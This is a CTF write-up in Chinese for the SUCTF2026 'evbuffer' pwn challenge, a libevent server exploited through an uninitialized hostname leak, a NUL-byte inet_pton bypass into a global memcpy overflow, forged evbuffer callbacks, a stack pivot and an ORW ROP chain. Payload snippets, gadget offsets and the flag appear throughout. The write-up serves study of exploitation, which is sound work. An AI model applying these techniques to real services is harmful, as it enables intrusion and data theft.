# SUCTF2026-evbuffer

## 题目简述

目标程序基于 libevent，同时监听 TCP 8888 和 UDP 8889。两条路径最终都调用 `handle_business()`：先把输入作为 IPv4 字符串交给 `inet_pton`，通过后将整段网络数据复制到 32 字节的全局 `session.user_buf`，再返回一份包含主机名的 80 字节响应。

利用链由三个问题组成：

1. `local_hostname[64]` 未初始化，`gethostname` 只覆盖实际字符串，随后却复制完整 64 字节，泄漏不同事件回调栈上的 PIE、libevent/libc、heap 或 stack 指针；
2. 输入可使用 `合法 IPv4 + NUL + 二进制数据` 绕过 `inet_pton`，而后续 `memcpy` 仍按原始报文长度写入，造成全局区溢出；
3. UDP session 位于 TCP session 之前，可用 UDP 溢出改写 TCP session 的 `type` 和 `bufferevent *`，再由 TCP 路径调用 `evbuffer_add_reference()`，把伪造的 evbuffer callback 转化为控制流劫持。

程序开启 Full RELRO、Canary、NX、PIE，seccomp 仅禁止 `execve/execveat`。因此最终可以用 `open/read/write` ROP，或者先 `mprotect` 再运行 ORW shellcode。

## 解题过程

### 1. 分析全局对象布局

源码中的核心结构为：

```c
#define USER_BUF_SIZE 32

struct session {
    char user_buf[32];       // +0x00
    proto_t type;            // +0x20
    struct bufferevent *bev; // +0x28
    int udp_fd;              // +0x30
};                          // sizeof = 0x38

struct session g_sessions[2];
```

该二进制中：

```text
g_sessions[0] / UDP = PIE + 0x4040
g_sessions[1] / TCP = PIE + 0x4078
TCP type             = PIE + 0x4098
TCP bev              = PIE + 0x40a0
```

TCP 和 UDP callback 都最多接收 `1023` 字节，而 `handle_business` 中没有检查目标 session 的 32 字节容量：

```c
temp_recv[n] = '\0';
if (inet_pton(AF_INET, temp_recv, &sin->sin_addr) != 0) {
    memcpy(s->user_buf, temp_recv, n);
    /* ... */
}
```

`inet_pton` 按 C 字符串解析，在第一个 NUL 处停止；`memcpy` 则继续复制 `n` 个字节。因此 payload 以：

```python
b"127.0.0.1\x00" + binary_payload
```

开头即可同时满足 IPv4 检查和长二进制溢出。真正的内存破坏来自无边界 `memcpy`，NUL 截断只是验证绕过手段。

### 2. 从响应泄漏地址

响应结构固定为 80 字节：

```c
struct response {
    struct sockaddr sa; // 0x10
    char hostname[64];  // 0x40
};
```

程序虽然清零了堆上的 `response`，却把未初始化栈数组完整复制进去：

```c
char local_hostname[64];
gethostname(local_hostname, sizeof(local_hostname));
memcpy(resp->hostname, local_hostname, sizeof(resp->hostname));
```

主机名结束后的字节仍保留旧栈内容。TCP 与 UDP 事件回调的调用栈不同，所以两份响应会给出不同地址。参赛队所用构建中可稳定计算：

```python
tcp_resp = recv_exact(tcp_sock, 0x50)
udp_resp = recv_exact(udp_sock, 0x50)

libevent_base = u64(tcp_resp[0x48:0x50]) - 0x13b1a
pie_base      = u64(udp_resp[0x48:0x50]) - 0x1619
```

官方 exp 在同样的泄漏区还取出了 heap 和 stack，并按另一组调用点计算 libc：

```python
heap      = u64(tcp_resp[0x28:0x30])
libc_base = u64(tcp_resp[0x48:0x50]) - 0x25cb1a
stack     = u64(udp_resp[0x40:0x48]) - 0x3a0
```

这些偏移绑定具体 `pwn`、libevent 和 libc 构建。复现时应确认泄漏落在哪个模块及调用点，而不是同时套用两套公式。

### 3. 用 UDP 溢出接管 TCP session

参赛队方案把所有 fake object 和 ROP 都直接放进 `.bss` 溢出区，避免依赖 heap/stack 地址。关键地址为：

```python
base      = pie_base + 0x4040
fake_ev   = pie_base + 0x4140
fake_cb   = pie_base + 0x41c0
rop_stack = pie_base + 0x4240
path_addr = pie_base + 0x4380
buf_addr  = pie_base + 0x43c0
fake_bev  = pie_base + 0x3f38
```

UDP payload 从 `base` 开始，并保持 UDP session 的 `type == PROTO_UDP`，以免当前请求误入 TCP 分支。跨过第一个 session 后，覆写：

```python
payload[0x58:0x5c] = p32(1)         # TCP session.type
payload[0x60:0x68] = p64(fake_bev)  # TCP session.bev
payload[0x10:0x18] = p64(fake_ev)   # 位于 fake_bev + 0x118
```

该 libevent 构建中的 `bufferevent_get_output()` 等价于：

```asm
mov rax, [rdi + 0x118]
ret
```

由于 `fake_bev + 0x118 == base + 0x10`，后续 TCP 请求执行：

```c
output = bufferevent_get_output(s->bev);
evbuffer_add_reference(output, resp, 0x50, cleanup_response, NULL);
```

时，`output` 就变成 `.bss` 中的 `fake_ev`。

### 4. 伪造 evbuffer callback 并迁移栈

`evbuffer_add_reference()` 会给目标 evbuffer 插入一个新 chain，随后调用 `evbuffer_invoke_callbacks_()`。只要 fake evbuffer 的链表、长度和 callback 字段满足最小检查，就能执行 fake callback 中的函数指针。

参赛队方案把 callback 函数设为：

```text
PIE + 0x1012: add rsp, 8 ; ret
```

并在 fake evbuffer 的长度相关字段中编码 `pop rsp ; ret` 与目标 `rop_stack`，形成：

```text
callback call
  → add rsp, 8 ; ret
  → pop rsp ; ret
  → rsp = PIE + 0x4240
  → ORW ROP
```

关键字段的最小示意为：

```python
fake_ev_off = fake_ev - base
payload[fake_ev_off + 0x10:fake_ev_off + 0x18] = p64(fake_ev)
payload[fake_ev_off + 0x18:fake_ev_off + 0x20] = p64(pivot_value)
payload[fake_ev_off + 0x20:fake_ev_off + 0x28] = p64(rop_stack - 0x50)
payload[fake_ev_off + 0x78:fake_ev_off + 0x80] = p64(fake_cb)

fake_cb_off = fake_cb - base
payload[fake_cb_off + 0x10:fake_cb_off + 0x18] = p64(add_rsp_8_ret)
payload[fake_cb_off + 0x20:fake_cb_off + 0x24] = p32(1)
```

`pivot_value` 需要按该版本 `evbuffer_add_reference` 对长度字段的运算反推，参赛队 exp 使用 `pop_rsp_ret + rop_stack - 0x50`。调试时应在 callback 调用前检查链表和实际栈内容。

官方方案则把 fake bufferevent、fake evbuffer、callback、chain 和 pivot trampoline 都放在泄漏出的栈上，通过 libc 中的 `push rsi`、间接 jump、`pop rsp` 和 `add rsp` 组合迁移，随后 `mprotect` 栈页并运行 shellcode。两条路线的核心相同：把 `evbuffer_add_reference` 的 callback 机制变成一次受控间接调用。

### 5. 构造 ORW

seccomp 只拦截执行新程序，因此可以直接使用参赛队方案中 libevent 的 PLT 和 gadget：

```text
open@plt  = libevent_base + 0xcb24
read@plt  = libevent_base + 0xc904
write@plt = libevent_base + 0xc714

pop rsp ; ret = libevent_base + 0xcf2d
pop rsi ; ret = libevent_base + 0xd2e5
pop rdx ; pop rbx ; pop rbp ; pop r12 ; ret
              = libevent_base + 0x339dd
pop rdi ; ret = pie_base + 0x194b
```

ROP 逻辑为：

```text
open("/flag", O_RDONLY)
read(flag_fd, PIE + 0x43c0, 0x80)
write(tcp_fd, PIE + 0x43c0, 0x80)
exit(0)
```

文件描述符取决于部署包装和已建立连接。官方本地样例把 TCP socket 视为 8；更稳妥的远程脚本应尝试少量候选 TCP fd，并按 `open` 通常返回下一个空闲 fd 的关系设置 `flag_fd = tcp_fd + 1`。

完整触发顺序是：

1. 保持 TCP 连接，发送短 IPv4 并接收泄漏；
2. 发送短 UDP IPv4 并接收 PIE 泄漏；
3. 通过 UDP 发送包含所有 fake object 的长 payload；
4. 再向原 TCP 连接发送一次合法 IPv4；
5. TCP 路径使用已被改写的 `session.bev`，进入 fake callback、栈迁移和 ORW；
6. 从 TCP 连接读取 flag。

仓库环境和参赛队结果均为：

```text
flag{80e59f78-d2a3-4e6a-bbbf-8027d25c2b9b}
```

## 方法总结

本题把信息泄漏、验证绕过和控制流劫持分散在不同层：未初始化的主机名栈缓冲区泄漏地址；IPv4 字符串后的 NUL 让二进制尾部绕过 `inet_pton`；无边界 `memcpy` 从 UDP session 覆盖到 TCP session；最后借 libevent 的 `bufferevent_get_output → evbuffer_add_reference → callback` 数据流完成间接调用和栈迁移。

审计事件驱动程序时，不能只看单个 socket callback。这里 TCP 与 UDP 共享相邻全局状态，而响应栈和利用触发点又各有用途，必须把两个协议的对象布局和事件时序一起建模。针对第三方库对象的伪造，还应从实际使用到的最小字段出发，并绑定附件中的库版本验证偏移，避免照搬其它 libevent 构建的结构布局。
